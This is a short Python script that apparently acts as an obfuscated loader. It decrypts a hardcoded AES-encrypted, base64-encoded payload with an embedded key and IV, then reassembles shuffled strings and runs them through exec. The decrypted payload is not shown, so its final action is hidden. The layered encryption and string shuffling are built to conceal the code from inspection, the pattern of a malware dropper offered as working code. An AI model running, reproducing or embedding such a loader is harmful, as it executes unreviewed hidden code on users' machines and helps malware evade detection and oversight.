
#!/usr/bin/python
import Crypto,base64
from Crypto.Cipher import AES
from base64 import b64decode, b64encode

def ddc(pld,key,iv):
    obj3 = AES.new(key,AES.MODE_CFB,iv)
    cd = obj3.decrypt(pld)

    return cd
def exddc(pld,key,iv):
    cP = pld
    out = b64decode(cP)
    x = ddc(out,key,iv)
    return x
def rcnLn(shfLn,arrMap):
    cmd=""
    
    
    for indice in arrMap:
        cmd = "{}{}".format(str(cmd),str(shfLn[indice]))
    

    return cmd
    
def rcnPld(shfPld):
    exec(shfPld)
    for key in shfPld:
        key = int(key)
        cmd = ""
        shfLn = shfPld[key][0]
        
         
        arrMap = shfPld[key][1] 
        cmd = rcnLn(shfLn,arrMap)
        exec(cmd)
        
    return

key="""V63TLCEKJN06P9ECVZ5MNC64P7MSYNPU"""
iv="""0m3wo4u4a7y0vjsl"""

pld=str("""
6gpv/5va342DZ6yHo8/WAG2mbLfXjnxPdsiZMhothZFLR8EL009Z8wXxWe2tDCaZJGYSzecxCA4dVROMB6Tl967x4QkCoSW28neZnU6kuFGeKS6NdmFESWp2Z/T7s/nl7rWEWn9N3P/BegSa/ygyzbbdkpKi7riO1l99yRBXVDcf8shcrMLKRT2RFxvSrssGzv3Fs3GZCiBLno9ljEuNXblCOV7WJsr8CuW+IJ1oZRy6uviZn3j9FguweSCS92bFRKHLpIa8ZjC0gW1JfF73NfYnfLDnIFOmq+pNVacCfv3jA/4zvcvkXel/DwG6z3jegR5HaP2Ai4E+DXhEMCsElaVAc2n9EBeVu8E9+qzgqX7i4wFFxECeJI5Cw3fi3IpLbOn1lw2Ies9R7brKxCFwe3aeqAMecdAOgNvelboghdkZ+odoXM9kWjY2V9Vlhvx/2tUC3H2rm2dt/+SGD5LIPUiyvTWF3jTOoywjE2jeBxuFwuS+iOuriwF70KA9aGyn8FTmcAMFOOGGY6lSi3MTw1eEPPoyAYjLXjU5GhzX/m986LivSbYPlACy0l9IOam2cZnLpD0mIlaZnE6094aPuOxgSBUtBsTLhGEgcuICxGPknmRzNSW48ablMqRJeofq1KGNe8f3s/iktAQD3eXWLB1T01L0vvBvJt+zT9TaPyrf+SHe+1lxSfNdAp4PLJAOQXe7X40qio72f3UTD75D6T1fDiOam/neV0c5H7yowfKXzKMHw/XEho6z4UATrGaEhD5Y+1Ic8s1+2DUKLU+QgWlcE26cr1pqCig5hS4SfO/hYfrFhxOzuHajA5KyArfjyhdxe3gDSShCoQWSA+kF8l9F+ut2VqlPHpJ4BJsz6VJsrZkrCXyGCBa/Kg3Vx9Hvd5P1xtaeebQFrb7VJTPFdC7jbJTpGsXCfyTHavKT1iIZrcXbgyife0XOdYSs9Lsl48VJ8AF0fN/PIA8qLsbK2w2S+9rbIn823qngcNl5WLQ0E0a9zhiULc+G6z3J6/q9lhTXNC8hGwqyIo3FvAQdS6YMepbxW7VFI58P5Pf+s3hjluv5PXzmIvznMpsvc4KNLbngQlQWOAddE9eSQitbsTXyW+pcI32di/nVY4QgZFTUbCrpDBbCuDpvJdbMKTME2rgmyc6y9VAJSMFBTTdalU3wL3J0jkojkaLJNCAbIr7vwIhO3DPx1f+2qWVxU7mVuhVUJlQnh0DFePWnIoyBA7XiKfFxQbLC5zydwLrQlWeYrK9RfPMpj+W55xtXtv9wJu6FUNGH/7r9g496hQFZoWcOB64DCuju5zq5hvD0ff+VkiEfcWazSxUJHEoTQV4JEGqUV7g+ugSIVDPI9tAMZg==
""")
            

def mn(xc=pld):
    cd=xc
    sP = exddc(cd,key,iv)
    
    
    
    nS = "shfPld={}".format(str(sP))
    
    rcnPld(nS)
    return
mn()